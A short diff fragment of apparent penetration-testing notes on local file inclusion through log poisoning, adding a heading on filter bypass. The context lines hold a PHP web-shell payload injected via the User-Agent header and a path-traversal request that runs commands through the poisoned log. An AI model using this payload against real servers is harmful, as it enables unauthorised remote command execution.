@@ -23,3 +23,6 @@ User-Agent: <?php echo system($_GET['cmd']); ?>
 # Send request to index.php
 ../../../logs.log&cmd=ls
 # will pass the cmd command to poisoned log.
+
+======= FILTERS =======
+Easy: case sensitive
